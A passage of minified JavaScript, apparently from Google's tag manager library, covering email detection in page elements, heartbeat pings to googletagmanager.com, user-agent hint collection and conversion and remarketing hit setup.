            if (g && oh(a[d].element, g)) {
              e = !1;
              break;
            }
          }
          e && c.push(a[d]);
        }
        return c;
      },
      zs = function (a, b) {
        if (a.length <= 1) return a;
        var c = a.filter(b);
        return 0 === c.length ? a : c;
      },
      ys = function (a) {
        var b;
        if (a === H.body) b = "body";
        else {
          var c;
          if (a.id) c = "#" + a.id;
          else {
            var d;
            if (a.parentElement) {
              var e;
              a: {
                var f = a.parentElement;
                if (f) {
                  for (var g = 0; g < f.childElementCount; g++)
                    if (f.children[g] === a) {
                      e = g + 1;
                      break a;
                    }
                  e = -1;
                } else e = 1;
              }
              d = ys(a.parentElement) + ">:nth-child(" + e.toString() + ")";
            } else d = "";
            c = d;
          }
          b = c;
        }
        return b;
      },
      ns = function (a) {
        for (var b = [], c = 0; c < a.length; c++) {
          var d = a[c],
            e = d.textContent;
          if (
            ("INPUT" === d.tagName.toUpperCase() && d.value && (e = d.value), e)
          ) {
            var f = e.match(Bs);
            if (f) {
              var k,
                g = f[0];
              if (G.location) {
                var m = Ui(G.location, "host", !0);
                k = g.toLowerCase().indexOf(m) >= 0;
              } else k = !1;
              k || b.push({ element: d, X: g });
            }
          }
        }
        return b;
      },
      ms = function () {
        var a = [],
          b = H.body;
        if (!b) return { elements: a, status: "4" };
        for (
          var c = b.querySelectorAll("*"), d = 0;
          d < c.length && d < 1e4;
          d++
        ) {
          var e = c[d];
          if (
            !(Cs.indexOf(e.tagName.toUpperCase()) >= 0) &&
            e.children instanceof HTMLCollection
          ) {
            for (var f = !1, g = 0; g < e.childElementCount && g < 1e4; g++)
              if (!(Ds.indexOf(e.children[g].tagName.toUpperCase()) >= 0)) {
                f = !0;
                break;
              }
            (!f || (U(25) && -1 !== Es.indexOf(e.tagName))) && a.push(e);
          }
        }
        return { elements: a, status: c.length > 1e4 ? "2" : "1" };
      },
      Bs = /[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/i,
      is = /@(gmail|googlemail)\./i,
      As = /support|noreply/i,
      Cs = "SCRIPT STYLE IMG SVG PATH BR NOSCRIPT TEXTAREA".split(" "),
      Ds = ["BR"],
      vs = { nc: "1", qe: "2", ke: "3", ne: "4", cg: "5", Ug: "6", Gf: "7" },
      ls = {},
      Es = ["INPUT", "SELECT"],
      $s = Number("") || 5,
      at = Number("") || 50,
      bt = tb(),
      dt = function (a, b) {
        a &&
          (ct("sid", a.targetId, b),
          ct("cc", a.clientCount, b),
          ct("tl", a.totalLifeMs, b),
          ct("hc", a.heartbeatCount, b),
          ct("cl", a.clientLifeMs, b));
      },
      ct = function (a, b, c) {
        null != b && c.push(a + "=" + b);
      },
      et = function () {
        var b,
          a = H.referrer;
        return a
          ? Si(Yi(a), "host") === (null == (b = G.location) ? void 0 : b.host)
            ? 1
            : 2
          : 0;
      },
      ft = function (a) {
        (this.P = a), (this.H = 0);
      };
    (ft.prototype.D = function (a, b, c, d) {
      var f,
        e = et(),
        g = [];
      (f =
        G === G.top && 0 !== e && b
          ? (null == b ? void 0 : b.clientCount) > 1
            ? 2 === e
              ? 1
              : 2
            : 2 === e
            ? 0
            : 3
          : 4),
        a && ct("si", a.Qf, g),
        ct("m", 0, g),
        ct("iss", f, g),
        ct("if", c, g),
        dt(b, g),
        d && ct("fm", encodeURIComponent(d.substring(0, at)), g),
        this.K(g);
    }),
      (ft.prototype.j = function (a, b, c, d, e) {
        var f = [];
        ct("m", 1, f),
          ct("s", a, f),
          ct("po", et(), f),
          b && (ct("st", b.state, f), ct("si", b.Qf, f), ct("sm", b.Xf, f)),
          dt(c, f),
          ct("c", d, f),
          e && ct("fm", encodeURIComponent(e.substring(0, at)), f),
          this.K(f);
      }),
      (ft.prototype.K = function (a) {
        (a = void 0 === a ? [] : a),
          !mj ||
            this.H >= $s ||
            (ct("pid", bt, a),
            ct("bc", ++this.H, a),
            a.unshift("ctid=" + Qf.ctid + "&t=s"),
            this.P("https://www.googletagmanager.com/a?" + a.join("&")));
      });
    var gt = {
      ml: Number("") || 500,
      Tk: Number("") || 5e3,
      sj: Number("20") || 10,
      Ak: Number("") || 5e3,
    };
    function ht(a) {
      return (a.performance && a.performance.now()) || Date.now();
    }
    var kt,
      jt = "https://" + gi.Gd + "/gtm/static/",
      lt = function () {
        return (
          kt ||
            (kt = new ft(function (a) {
              Dc(a);
            })),
          kt
        );
      },
      mt = function (a) {
        if (!a) {
          var b = zi.fb;
          a = b || jt;
        }
        var c;
        try {
          c = new URL(a);
        } catch (d) {
          return null;
        }
        return "https:" !== c.protocol ? null : c;
      },
      nt = function (a) {
        var b = jo(eo.Cj);
        return b && b[a];
      },
      ot = function (a, b, c) {
        var d = this;
        (this.D = lt()),
          (this.P = this.K = !1),
          (this.Z = null),
          (this.initTime = c),
          (this.j = 15),
          (this.H = this.Al(a)),
          G.setTimeout(function () {
            d.qj();
          }, 1e3),
          I(function () {
            d.gm(a, b);
          });
      };
    function pt(a, b) {
      var c = G.location.origin;
      if (c) {
        zi.D && (a = "" + c + Ai() + "/_");
        var d = mt(a);
        if (null !== d && !nt(d.origin))
          if (rc()) {
            var f,
              e = new ot(d, !!a, b || Math.round(Cb()));
            a: {
              var g = eo.Cj,
                m = ho(g);
              if (!m) {
                if (!(m = ho(g, !0))) {
                  f = void 0;
                  break a;
                }
                m.set({});
              }
              f = m.get();
            }
            f[d.origin] = e;
          } else lt().D(void 0, void 0, 6);
      }
    }
    ((ba = ot.prototype).delegate = function (a, b, c) {
      2 !== this.getState()
        ? (this.D.j(this.j, void 0, void 0, a.commandType),
          c({ failureType: this.j }))
        : this.H.sl(a, b, c);
    }),
      (ba.getState = function () {
        return this.H.getState().state;
      }),
      (ba.gm = function (a, b) {
        var c = G.location.origin,
          d = this,
          e = Cc();
        try {
          var f = e.contentDocument.createElement("iframe"),
            g = a.pathname,
            k = b ? "&1p=1" : "";
          Cc(
            ("/" === g[g.length - 1] ? a.toString() : a.toString() + "/") +
              "sw_iframe.html?origin=" +
              encodeURIComponent(c) +
              k,
            void 0,
            void 0,
            void 0,
            f
          );
          var m = function () {
            e.contentDocument.body.appendChild(f),
              f.addEventListener("load", function () {
                (d.Z = f.contentWindow),
                  e.contentWindow.addEventListener("message", function (n) {
                    n.origin === a.origin && d.H.Wl(n.data);
                  }),
                  d.qj();
              });
          };
          "complete" === e.contentDocument.readyState
            ? m()
            : e.contentWindow.addEventListener("load", function () {
                m();
              });
        } catch (n) {
          e.parentElement.removeChild(e),
            (this.j = 11),
            this.D.D(void 0, void 0, this.j, n.toString());
        }
      }),
      (ba.Al = function (a) {
        var b = this,
          c = (function (a, b) {
            var d = function (e, f, g) {
              (g = void 0 === g ? {} : g),
                (this.ol = e),
                (this.j = f),
                (this.H = g),
                (this.Z = this.Ra = this.heartbeatCount = this.nl = 0),
                (this.tj = !1),
                (this.D = {}),
                (this.id = String(
                  Math.floor(Number.MAX_SAFE_INTEGER * Math.random())
                )),
                (this.state = 0),
                (this.Qf = ht(this.j)),
                (this.Xf = ht(this.j)),
                (this.P = 10);
            };
            return (
              (d.prototype.init = function () {
                this.K(1), this.fb();
              }),
              (d.prototype.getState = function () {
                return {
                  state: this.state,
                  Qf: Math.round(ht(this.j) - this.Qf),
                  Xf: Math.round(ht(this.j) - this.Xf),
                };
              }),
              (d.prototype.K = function (e) {
                this.state !== e && ((this.state = e), (this.Xf = ht(this.j)));
              }),
              (d.prototype.wj = function () {
                return String(this.nl++);
              }),
              (d.prototype.fb = function () {
                var e = this;
                this.heartbeatCount++,
                  this.fc(
                    {
                      type: 0,
                      clientId: this.id,
                      requestId: this.wj(),
                      maxDelay: this.uj(),
                    },
                    function (f) {
                      var g;
                      if (0 === f.type)
                        if (
                          null !=
                          (null == (g = f.failure) ? void 0 : g.failureType)
                        )
                          if (
                            (f.stats && (e.stats = f.stats),
                            e.Z++,
                            f.isDead || e.Z > gt.sj)
                          ) {
                            var m,
                              n,
                              k = f.isDead && f.failure.failureType;
                            (e.P = k || 10),
                              e.K(4),
                              e.kl(),
                              null == (n = (m = e.H).Am) ||
                                n.call(m, {
                                  failureType: k,
                                  data: f.failure.data,
                                });
                          } else e.K(3), e.yj();
                        else {
                          var p, q;
                          e.heartbeatCount > f.stats.heartbeatCount + gt.sj &&
                            ((e.heartbeatCount = f.stats.heartbeatCount),
                            null == (q = (p = e.H).onFailure) ||
                              q.call(p, { failureType: 13 })),
                            (e.stats = f.stats);
                          var r = e.state;
                          if ((e.K(2), 2 !== r))
                            if (e.tj) {
                              var t, u;
                              null == (u = (t = e.H).Tn) || u.call(t);
                            } else {
                              var v, w;
                              (e.tj = !0),
                                null == (w = (v = e.H).Bm) || w.call(v);
                            }
                          (e.Z = 0), e.pl(), e.yj();
                        }
                    }
                  );
              }),
              (d.prototype.uj = function () {
                return 2 === this.state ? gt.Tk : gt.ml;
              }),
              (d.prototype.yj = function () {
                var e = this;
                this.j.setTimeout(function () {
                  e.fb();
                }, Math.max(0, this.uj() - (ht(this.j) - this.Ra)));
              }),
              (d.prototype.sl = function (e, f, g) {
                var k = this;
                this.fc(
                  {
                    type: 1,
                    clientId: this.id,
                    requestId: this.wj(),
                    command: e,
                  },
                  function (m) {
                    if (1 === m.type)
                      if (m.result) f(m.result);
                      else {
                        var n,
                          p,
                          q,
                          t,
                          u,
                          r = {
                            failureType:
                              null !=
                              (q =
                                null == (n = m.failure)
                                  ? void 0
                                  : n.failureType)
                                ? q
                                : 12,
                            data: null == (p = m.failure) ? void 0 : p.data,
                          };
                        null == (u = (t = k.H).onFailure) || u.call(t, r), g(r);
                      }
                  }
                );
              }),
              (d.prototype.fc = function (e, f) {
                var g = this;
                if (4 === this.state)
                  (e.failure = { failureType: this.P }), f(e);
                else {
                  var n,
                    k = 2 !== this.state && 0 !== e.type,
                    m = e.requestId,
                    q = {
                      request: e,
                      kk: f,
                      gk: k,
                      wm: this.j.setTimeout(
                        function () {
                          var r = g.D[m];
                          r && g.rj(r, 7);
                        },
                        null != (n = e.maxDelay) ? n : gt.Ak
                      ),
                    };
                  (this.D[m] = q), k || this.Ej(q);
                }
              }),
              (d.prototype.Ej = function (e) {
                (this.Ra = ht(this.j)), (e.gk = !1), this.ol(e.request);
              }),
              (d.prototype.pl = function () {
                for (
                  var e = ma(Object.keys(this.D)), f = e.next();
                  !f.done;
                  f = e.next()
                ) {
                  var g = this.D[f.value];
                  g.gk && this.Ej(g);
                }
              }),
              (d.prototype.kl = function () {
                for (
                  var e = ma(Object.keys(this.D)), f = e.next();
                  !f.done;
                  f = e.next()
                )
                  this.rj(this.D[f.value], this.P);
              }),
              (d.prototype.rj = function (e, f) {
                this.nd(e);
                var g = e.request;
                (g.failure = { failureType: f }), e.kk(g);
              }),
              (d.prototype.nd = function (e) {
                delete this.D[e.request.requestId], this.j.clearTimeout(e.wm);
              }),
              (d.prototype.Wl = function (e) {
                this.Ra = ht(this.j);
                var g,
                  k,
                  f = this.D[e.requestId];
                f
                  ? (this.nd(f), f.kk(e))
                  : null == (k = (g = this.H).onFailure) ||
                    k.call(g, { failureType: 14 });
              }),
              new d(a, G, b)
            );
          })(
            function (d) {
              var e;
              null == (e = b.Z) || e.postMessage(d, a.origin);
            },
            {
              Bm: function () {
                (b.K = !0), b.D.D(c.getState(), c.stats);
              },
              Am: function (d) {
                b.K
                  ? ((b.j = (null == d ? void 0 : d.failureType) || 10),
                    b.D.j(
                      b.j,
                      c.getState(),
                      c.stats,
                      void 0,
                      null == d ? void 0 : d.data
                    ))
                  : ((b.j = (null == d ? void 0 : d.failureType) || 4),
                    b.D.D(
                      c.getState(),
                      c.stats,
                      b.j,
                      null == d ? void 0 : d.data
                    ));
              },
              onFailure: function (d) {
                (b.j = d.failureType),
                  b.D.j(b.j, c.getState(), c.stats, d.command, d.data);
              },
            }
          );
        return c;
      }),
      (ba.qj = function () {
        this.P || this.H.init(), (this.P = !0);
      });
    var qt = function (a, b, c, d) {
      var e;
      if (null == (e = nt(a)) || !e.delegate) {
        var f = rc() ? 16 : 6;
        return (
          lt().j(f, void 0, void 0, b.commandType), void d({ failureType: f })
        );
      }
      nt(a).delegate(b, c, d);
    };
    function rt(a, b, c, d) {
      var e = mt();
      if (null !== e) {
        var f,
          g = null == (f = nt(e.origin)) ? void 0 : f.initTime,
          k = Math.round(Cb());
        qt(
          e.origin,
          {
            commandType: 0,
            params: {
              url: a,
              method: 0,
              templates: b,
              body: "",
              processResponse: !1,
              sinceInit: g ? k - g : void 0,
            },
          },
          function () {
            c();
          },
          function (m) {
            d(m.failureType);
          }
        );
      } else d(rc() ? 16 : 6);
    }
    function ut(a) {
      return [];
    }
    Tm(),
      Wm() || Qm("iPod"),
      Qm("iPad"),
      !Qm("Android") || Um() || Tm() || Sm() || Qm("Silk"),
      Um(),
      !Qm("Safari") ||
        Um() ||
        (!Rm() && Qm("Coast")) ||
        Sm() ||
        (!Rm() && Qm("Edge")) ||
        (Rm() ? Pm("Microsoft Edge") : Qm("Edg/")) ||
        (Rm() ? Pm("Opera") : Qm("OPR")) ||
        Tm() ||
        Qm("Silk") ||
        Qm("Android") ||
        Xm();
    var wt = {},
      xt = null,
      At =
        "platform platformVersion architecture model uaFullVersion bitness fullVersionList wow64".split(
          " "
        );
    function Ct() {
      var b,
        a = G.google_tag_data;
      if (null != a && a.uach) {
        var c = a.uach,
          d = Object.assign({}, c);
        c.fullVersionList && (d.fullVersionList = c.fullVersionList.slice(0)),
          (b = d);
      } else b = null;
      return b;
    }
    function Dt() {
      var a, b;
      return null !=
        (b = null == (a = G.google_tag_data) ? void 0 : a.uach_promise)
        ? b
        : null;
    }
    function Et(a) {
      var b, c;
      return (
        "function" ==
        typeof (null == (b = a.navigator) || null == (c = b.userAgentData)
          ? void 0
          : c.getHighEntropyValues)
      );
    }
    var Gt,
      Ht = function () {
        if (Et(G) && ((Gt = Cb()), !Dt())) {
          var a = (function Ft() {
            var a = G;
            if (!Et(a)) return null;
            var b = (function Bt(a) {
              var b;
              return null != (b = a.google_tag_data)
                ? b
                : (a.google_tag_data = {});
            })(a);
            if (b.uach_promise) return b.uach_promise;
            var c = a.navigator.userAgentData
              .getHighEntropyValues(At)
              .then(function (d) {
                return null != b.uach || (b.uach = d), d;
              });
            return (b.uach_promise = c);
          })();
          a &&
            (a.then(function () {
              O(95);
            }),
            a.catch(function () {
              O(96);
            }));
        }
      };
    function Lt(a) {
      var b, c;
      return !(
        null == (c = (b = void 0 === b ? document : b).featurePolicy) ||
        !c.allowedFeatures().includes(a)
      );
    }
    function Ot(a) {
      try {
        a.parentNode.removeChild(a);
      } catch (b) {}
    }
    var Qt = function () {
        return [P.g.R, P.g.O];
      },
      Rt = function (a) {
        if (null != a) {
          var b = String(a).substring(0, 512),
            c = b.indexOf("#");
          return -1 == c ? b : b.substring(0, c);
        }
        return "";
      },
      St = function (a) {
        a.metadata.speculative_in_message || (a.metadata.speculative = !1);
      },
      Tt = function (a, b) {
        return (
          Array.isArray(b) || (b = [b]), b.indexOf(a.metadata.hit_type) >= 0
        );
      },
      Ut = function (a) {
        var b = a.target.ma[sl[1]];
        if (b) {
          a.o[P.g.Vc] = b;
          var c = a.target.ma[sl[2]];
          c && (a.o[P.g.qb] = c);
        } else a.isAborted = !0;
      },
      Vt = function (a) {
        if (
          Tt(a, [
            "conversion",
            "remarketing",
            "user_data_lead",
            "user_data_web",
          ])
        ) {
          var b = a.o[P.g.qb],
            c = !0 === Q(a.m, P.g.ef);
          switch (
            (c && (a.metadata.remarketing_only = !0), a.metadata.hit_type)
          ) {
            case "conversion":
              !c && b && St(a),
                (U(101)
                  ? -1 !== qc.userAgent.toLowerCase().indexOf("firefox") ||
                    vc("Edg/") ||
                    vc("EdgA/") ||
                    vc("EdgiOS/")
                  : -1 !== qc.userAgent.toLowerCase().indexOf("firefox")) &&
                  (a.metadata.is_gcp_conversion = !0);
              break;
            case "user_data_lead":
            case "user_data_web":
              !c && b && (a.isAborted = !0);
              break;
            case "remarketing":
              (!c && b) || St(a);
          }
          Tt(a, ["conversion", "remarketing"]) &&
            (a.o[P.g.nj] = a.metadata.is_gcp_conversion
              ? "www.google.com"
              : "www.googleadservices.com");
        }
      },
      Wt = function (a) {
        Tt(a, ["conversion", "remarketing"]);
      },
      Xt = function (a) {
        if (
          !a.metadata.consent_updated &&
          Tt(a, ["conversion", "remarketing"])
        ) {
          var b = en(!1);
          a.o[P.g.Jb] = b;
          var c = Q(a.m, P.g.wa);
          c || (c = 1 === b ? G.top.location.href : G.location.href),
            (a.o[P.g.wa] = Rt(c)),
            a.copyToHitData(P.g.Da, H.referrer),
            (a.o[P.g.cb] = kr()),
            a.copyToHitData(P.g.Qa);
          var k,
            d = (function Zr() {
              var a = G.screen;
              return { width: a ? a.width : 0, height: a ? a.height : 0 };
            })();
          a.o[P.g.Mb] = d.width + "x" + d.height;
          for (var e, f = G, g = f; f && f != f.parent; )
            (f = f.parent), cn(f) && (g = f);
          var m = (e = g).location.href;
          if (e === e.top) k = { url: m, mm: !0 };
          else {
            var n = !1,
              p = e.document;
            p &&
              p.referrer &&
              ((m = p.referrer), e.parent === e.top && (n = !0));
            var q = e.location.ancestorOrigins;
            if (q) {
              var r = q[q.length - 1];
              r && -1 === m.indexOf(r) && ((n = !1), (m = r));
            }
            k = { url: m, mm: n };
          }
          var t = k;
          t.url && c !== t.url && (a.o[P.g.vf] = Rt(t.url));
        }
      },
      Yt = function (a) {
        Tt(a, ["conversion", "remarketing"]) &&
          (a.copyToHitData(P.g.Aa),
          a.copyToHitData(P.g.na),
          a.copyToHitData(P.g.za));
      },
      Zt = function (a) {
        var b = ["conversion", "remarketing"];
        if (
          (b.push("page_view", "user_data_lead", "user_data_web"),
          Tt(a, b) && W(P.g.O))
        ) {
          a.copyToHitData(P.g.Ba);
          var c = jo(eo.Wg);
          if (void 0 === c) io(eo.Xg, !0);
          else {
            var d = jo(eo.ue);
            a.o[P.g.uf] = d + "." + c;
          }
        }
      },
      $t = function (a) {
        if (Et(G)) {
          if (void 0 !== Gt) {
            O(85);
            var b = Ct();
            b
              ? (function (a, b) {
                  a &&
                    ((b.o[P.g.xf] = a.architecture),
                    (b.o[P.g.yf] = a.bitness),
                    a.fullVersionList &&
                      (b.o[P.g.zf] = a.fullVersionList
                        .map(function (c) {
                          return (
                            encodeURIComponent(c.brand || "") +
                            ";" +
                            encodeURIComponent(c.version || "")
                          );
                        })
                        .join("|")),
                    (b.o[P.g.Af] = a.mobile ? "1" : "0"),
                    (b.o[P.g.Bf] = a.model),
                    (b.o[P.g.Cf] = a.platform),
                    (b.o[P.g.Df] = a.platformVersion),
                    (b.o[P.g.Ef] = a.wow64 ? "1" : "0"));
                })(b, a)
              : O(86);
          }
        } else O(87);
      },
      au = function (a) {
        Tt(a, ["conversion"]) &&
          W(P.g.O) &&
          (!0 === G._gtmpcm ||
          (function () {
            var a = (qc && qc.userAgent) || "";
            if (
              a.indexOf("Safari") < 0 ||
              /Chrome|Coast|Opera|Edg|Silk|Android/.test(a)
            )
              return !1;
            var b = (/Version\/([\d\.]+)/.exec(a) || [])[1] || "";
            if ("" === b) return !1;
            for (
              var c = ["14", "1", "1"], d = b.split("."), e = 0;
              e < d.length;
              e++
            ) {
              if (void 0 === c[e]) return !0;
              if (d[e] !== c[e]) return Number(d[e]) > Number(c[e]);
            }
            return d.length >= c.length;
          })()
            ? (a.o[P.g.Wb] = "2")
            : U(30) && Lt("attribution-reporting") && (a.o[P.g.Wb] = "1"));
      },
      bu = function (a) {
        if (Tt(a, ["conversion", "remarketing"]) && U(26)) {
          var b = function (c) {
            return !!U(28) && (ib("fdr", c), !0);
          };
          (W(P.g.R) || b(0)) &&
            (W(P.g.O) || b(1)) &&
            (!1 !== Q(a.m, P.g.Ca) || b(2)) &&
            (Jn(a.m) || b(3)) &&
            (!1 !== Q(a.m, P.g.Vb) || b(4)) &&
            (!1 !==
              (U(29)
                ? a.eventName === P.g.ba
                  ? Q(a.m, P.g.Ja)
                  : void 0
                : Q(a.m, P.g.Ja)) ||
              b(5)) &&
            ((function Mt() {
              return Lt("join-ad-interest-group") && pb(qc.joinAdInterestGroup);
            })() ||
              b(6)) &&
            (U(28) &&
            (function kb() {
              for (var a = [], b = hb.fdr || [], c = 0; c < b.length; c++)
                b[c] && a.push(c);
              return a.length > 0 ? a : void 0;
            })()
              ? ((a.o[P.g.Pi] = jb("fdr")), delete hb.fdr)
              : ((a.o[P.g.qg] = "1"),
                (a.metadata.send_fledge_experiment = !0)));
        }
      },
      cu = function (a) {
        (a.metadata.conversion_linker_enabled = !1 !== Q(a.m, P.g.ra)),
          (a.metadata.cookie_options = ir(a)),
          (a.metadata.redact_ads_data =
            null != Q(a.m, P.g.fa) && !1 !== Q(a.m, P.g.fa)),
          (a.metadata.allow_ad_personalization = Jn(a.m));
      },
      du = function (a) {
        if (Vs(a, "ccd_add_1p_data", !1) && W(Qt())) {
          var b = a.m.D[P.g.he];
          if (
            (function (a) {
              return !!Ta(a) && !!a.enable_code;
            })(b)
          ) {
            var c = Q(a.m, P.g.Ea);
            null === c
              ? (a.metadata.user_data_from_code = null)
              : (b.enable_code && Ta(c) && (a.metadata.user_data_from_code = c),
                Ta(b.selectors) &&
                  (a.metadata.user_data_from_manual = Ni(b.selectors)));
          }
        }
      },
      eu = function (a) {
        var b =
            !a.metadata.send_user_data_hit &&
            Tt(a, ["conversion", "user_data_web"]),
          c = !Vs(a, "ccd_add_1p_data", !1) && Tt(a, "user_data_lead");
        if ((b || c) && W(P.g.R)) {
          var d = "conversion" === a.metadata.hit_type,
            e = a.m,
            f = void 0,
            g = Q(e, P.g.Ea);
          if (d) {
            var k = (Q(e, P.g.Td) || {})[String(a.o[P.g.qb])];
            if (!0 === Q(e, P.g.Jd) || k) {
              var m, n;
              if (k)
                b: {
                  switch (k.enhanced_conversions_mode) {
                    case "manual":
                      if (g && Ta(g)) {
                        n = g;
                        break b;
                      }
                      var p = k.enhanced_conversions_manual_var;
                      n = void 0 !== p ? p : G.enhanced_conversion_data;
                      break b;
                    case "automatic":
                      n = Ni(k[P.g.pg]);
                      break b;
                  }
                  n = void 0;
                }
              else n = G.enhanced_conversion_data;
              var t,
                q = n,
                r = (k || {}).enhanced_conversions_mode;
              if (q) {
                if ("manual" === r)
                  switch (q._tag_mode) {
                    case "CODE":
                    default:
                      t = "c";
                      break;
                    case "AUTO":
                      t = "a";
                      break;
                    case "MANUAL":
                      t = "m";
                  }
                else t = "automatic" === r ? (wr(k) ? "a" : "m") : "c";
                m = { X: q, rk: t };
              } else m = { X: q, rk: void 0 };
              var u = m,
                v = u.rk;
              (f = u.X), (a.o[P.g.md] = v);
            }
          } else if (a.m.isGtmEvent)
            return (
              St(a),
              (a.metadata.user_data = g),
              void (a.o[P.g.md] = (function (a) {
                if (a)
                  switch (a._tag_mode) {
                    case "CODE":
                    default:
                      return "c";
                    case "AUTO":
                      return "a";
                    case "MANUAL":
                      return "m";
                  }
              })(g))
            );
          a.metadata.user_data = f;
        }
      },
      fu = function (a) {
        Tt(a, ["conversion", "remarketing"]) &&
          (a.m.isGtmEvent
            ? "conversion" !== a.metadata.hit_type &&
              a.eventName &&
              (a.o[P.g.xc] = a.eventName)
            : (a.o[P.g.xc] = a.eventName),
          z(a.m.j, function (b, c) {
            di[b.split(".")[0]] || (a.o[b] = c);
          }));
      },
      gu = function (a) {
        if (
          a.eventName === P.g.ba &&
          !a.metadata.consent_updated &&
          ((a.metadata.is_config_command = !0),
          Tt(a, "conversion") && (a.metadata.speculative = !0),
          !Tt(a, "remarketing") ||
            (!1 !== Q(a.m, P.g.Vb) && !1 !== Q(a.m, P.g.Ja)) ||
            (a.metadata.speculative = !0),
          Tt(a, "landing_page"))
        ) {
          var b = Q(a.m, P.g.sa) || {},
            c = Q(a.m, P.g.Xa),
            d = a.metadata.conversion_linker_enabled,
            e = a.metadata.redact_ads_data,
            f = {
              rd: d,
              yd: b,
              Ed: c,
              xa: a.metadata.source_canonical_id,
              m: a.m,
              zd: e,
              sk: Q(a.m, P.g.Ba),
            },
            g = a.metadata.cookie_options;
          !(function (a, b) {
            var c, d, e, f, g, k, m, n;
            (c = a.rd),
              (d = a.yd),
              (e = a.Ed),
              (f = a.xa),
              (g = a.m),
              (k = a.zd),
              (m = a.On),
              (n = a.sk),
              jr({ rd: c, yd: d, Ed: e, jc: b }),
              c &&
                !0 !== m &&
                ((n = null != n ? String(n) : void 0), Nq(b, f, g, k, n));
          })(f, g),
            Nr(a.target, a.m),
            Ar({
              hh: !1,
              zd: e,
              targetId: a.target.id,
              m: a.m,
              jc: d ? g : void 0,
              Pf: d,
              Pj: a.o[P.g.be],
              vh: a.o[P.g.ub],
              nh: a.o[P.g.rb],
              yh: a.o[P.g.Jb],
            }),
            (a.isAborted = !0);
        }
      },
      hu = function (a) {
        if (
          !Vs(a, "hasPreAutoPiiCcdRule", !1) &&
          Tt(a, "conversion") &&
          W(P.g.R)
        ) {
          var d,
            b = (Q(a.m, P.g.Td) || {})[String(a.o[P.g.qb])],
            c = a.o[P.g.Vc];
          if (!(d = wr(b)))
            if (Xk()) {
              var e = Yr("AW-" + c);
              d = !!e && !!e.preAutoPii;
            } else d = !1;
          if (d) {
            var f = Cb(),
              g = (function (a) {
                (a = a || { wd: !0, xd: !0, Vf: void 0 }).yb = a.yb || {
                  email: !0,
                  phone: !1,
                  address: !1,
                };
                var b = ks(a),
                  c = ls[b];
                if (c && Cb() - c.timestamp < 200) return c.result;
                var g,
                  k,
                  d = ms(),
                  e = d.status,
                  f = [],
                  m = [];
                if (U(25)) a.yb;
                else {
                  if (a.yb && a.yb.email) {
                    var n = ns(d.elements);
                    (f = os(n, a && a.De)),
                      (g = ps(f)),
                      n.length > 10 && (e = "3");
                  }
                  !a.Vf && g && (f = [g]);
                  for (var p = 0; p < f.length; p++)
                    m.push(qs(f[p], !!a.wd, !!a.xd));
                  m = m.slice(0, 10);
                }
                g && (k = qs(g, !!a.wd, !!a.xd));
                var C = { elements: m, Ph: k, status: e };
                return (ls[b] = { timestamp: Cb(), result: C }), C;
              })({ wd: !0, xd: !0, Vf: !0 });
            if (0 !== g.elements.length) {
              for (var k = [], m = 0; m < g.elements.length; ++m) {
                var n = g.elements[m];
                k.push(n.querySelector + "*" + js(n) + "*" + n.type);
              }
              a.o[P.g.Ng] = k.join("~");
              var p = g.Ph;
              p && ((a.o[P.g.Og] = p.querySelector), (a.o[P.g.Mg] = js(p))),
                (a.o[P.g.Lg] = String(Cb() - f)),
                (a.o[P.g.Pg] = g.status);
            }
          }
        }
      },
      iu = function (a) {
        if (a.eventName === P.g.Ua && !a.m.isGtmEvent) {
          if (!a.metadata.consent_updated && Tt(a, "conversion")) {
            var b = Q(a.m, P.g.Ib);
            if ("function" != typeof b) return;
            var c = String(Q(a.m, P.g.tb)),
              d = a.o[c],
              e = Q(a.m, c);
            c === P.g.Va || c === P.g.Gb
              ? (function (a, b, c, d) {
                  var e, f, g;
                  if (
                    ((e = a.tk),
                    (f = a.callback),
                    (g = a.Wj),
                    "function" == typeof f)
                  )
                    if (e === P.g.Va && void 0 === g) {
                      var k = d(b.prefix, c);
                      0 === k.length
                        ? f(void 0)
                        : 1 === k.length
                        ? f(k[0])
                        : f(k);
                    } else
                      e === P.g.Gb
                        ? (O(65), lp(b, !1), f(jp[mp(b.prefix)]))
                        : f(g);
                })(
                  { tk: c, callback: b, Wj: e },
                  a.metadata.cookie_options,
                  a.metadata.redact_ads_data,
                  Lq
                )
              : b(d || e);
          }
          a.isAborted = !0;
        }
      },
      ju = function (a) {
        if (Tt(a, "conversion") && W(P.g.R) && (a.o[P.g.nb] || a.o[P.g.zc])) {
          var b = a.o[P.g.qb],
            c = h(a.metadata.cookie_options),
            d = Vp(c.prefix);
          if (((c.prefix = "_gcl" === d ? "" : d), a.o[P.g.nb])) {
            var e = gr(b, c, U(65) && !a.metadata.gbraid_cookie_marked);
            (a.metadata.gbraid_cookie_marked = !0), e && (a.o[P.g.Qg] = e);
          }
          if (a.o[P.g.zc]) {
            var f = Zq(b, c).Ll;
            f && (a.o[P.g.wg] = f);
          }
        }
      },
      ku = function (a) {
        var d,
          e,
          f,
          b = U(7),
          c = a.m;
        if (!b) {
          var g = Kl(c, P.g.la);
          d = Mb(Ta(g) ? g : {});
        }
        var k = Kl(c, P.g.la, 1),
          m = Kl(c, P.g.la, 2);
        (e = Mb(Ta(k) ? k : {}, ".")),
          (f = Mb(Ta(m) ? m : {}, ".")),
          b || (a.o[P.g.be] = d),
          (a.o[P.g.ub] = e),
          (a.o[P.g.rb] = f);
      },
      lu = function (a) {
        if (Tt(a, ["conversion", "remarketing"])) {
          var b = "conversion" === a.metadata.hit_type;
          (b && a.eventName !== P.g.Ia) ||
            (a.copyToHitData(P.g.da),
            b &&
              (a.copyToHitData(P.g.Nd),
              a.copyToHitData(P.g.Ld),
              a.copyToHitData(P.g.Md),
              a.copyToHitData(P.g.Kd),
              (a.o[P.g.jg] = a.eventName)));
        }
      },
      mu = function (a) {
        if (
          Tt(a, [
            "conversion",
            "remarketing",
            "user_data_lead",
            "user_data_web",
          ])
        ) {
          var b = a.m;
          if (Tt(a, ["conversion", "remarketing"])) {
            var c = Q(b, P.g.Zb);
            (!0 !== c && !1 !== c) || (a.o[P.g.Zb] = c);
          }
          Jn(b)
            ? (a.o[P.g.Ob] = !1)
            : ((a.o[P.g.Ob] = !0), Tt(a, "remarketing") && (a.isAborted = !0));
        }
      },
      nu = function (a) {
        Tt(a, "conversion") &&
          (a.copyToHitData(P.g.fd),
          a.copyToHitData(P.g.Od),
          a.copyToHitData(P.g.ld),
          a.copyToHitData(P.g.Ud),
          a.copyToHitData(P.g.wc),
          a.copyToHitData(P.g.Zc));
      },
      ou = function (a) {
        Qr(a);
      },
